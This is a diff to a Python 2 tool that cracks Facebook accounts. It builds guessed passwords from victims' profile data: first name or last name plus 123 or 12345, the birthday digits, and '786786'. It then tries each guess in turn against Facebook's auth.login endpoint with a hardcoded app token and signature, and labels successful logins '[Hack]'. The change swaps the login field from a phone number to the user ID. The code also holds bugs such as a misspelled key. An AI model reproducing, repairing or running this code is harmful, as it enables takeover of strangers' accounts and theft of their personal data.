@@ -1094,7 +1094,7 @@ def crack():
 		time.sleep(1)
 		login()
 	os.system('clear')
-	print logo20
+	print logo19
 	print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;95mClone Friend List Public ID."
         time.sleep(0.05)
         print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;95mBlack Mafia WhatsApp Group Pakistan."
@@ -1181,7 +1181,7 @@ def pilih_crack():
                         a = requests.get('https://graph.facebook.com/' + user + '/?access_token='+toket)												
 	                b = json.loads(a.text)	
                         pass1 = b['first_name'] + '123'
-                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + mobile_phone + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         q = json.load(data)
                         if 'access_token' in q:
                             print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + mobile_phone + ' | ' + pass1 + ' --> ' + b['name']
@@ -1190,7 +1190,7 @@ def pilih_crack():
                                 print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + mobile_phone + ' | ' + pass1 + ' --> ' + b['name']
                             else:
                                     pass2 = b['firs_name'] + '12345'
-                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + mobile_phone + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     q = json.load(data)
                                     if 'access_token' in q:
                                         print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + mobile_phone + ' | ' + pass2 + ' --> ' + b['name']
@@ -1199,7 +1199,7 @@ def pilih_crack():
                                             print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + mobile_phone + ' | ' + pass2 + ' --> ' + ['name']
                                         else:
                                                 pass3 = b['last_name'] + '123'
-                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + mobile_phone + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                 q = json.load(data)
                                                 if 'access_token' in q:
                                                     print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + mobile_phone + ' | ' + pass3 + ' --> ' + b['name']
@@ -1208,7 +1208,7 @@ def pilih_crack():
                                                         print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + mobile_phone + ' | ' + pass3 + ' --> ' + b['name']
                                                     else:
 						            pass4 = b['last_name'] + '12345'
-                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + mobile_phone + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                             q = json.load(data)
                                                             if 'access_token' in q:
                                                                 print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + mobile_phone + ' | ' + pass4 + ' --> ' + b['name']
@@ -1218,7 +1218,7 @@ def pilih_crack():
                     					        else:
                                                                         birthday = b['birthday']
                                                                         pass5 = birthday.replace('/', '')
-                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + mobile_phone + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                         q = json.load(data)
                                                                         if 'access_token' in q:
                                                                             print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + mobile_phone + ' | ' + pass5 + ' --> ' + b['name']
@@ -1227,7 +1227,7 @@ def pilih_crack():
                                                                                 print '\x1b[1;97m[\x1b[1;93m[CP]\x1b[1;97m ' + mobile_phone + ' | ' + pass5 + ' --> ' + b['name']
                                                                             else:
                                                                                     pass6 = ('786786')
-                                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + mobile_phone + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                     q = json.load(data)
                                                                                     if 'access_token' in q:
                                                                                         print '\x1b[1;97m\x1b[1;92m[Hack]\x1b[1;97m ' + mobile_phone + ' | ' + pass6 + ' --> ' + b['name']
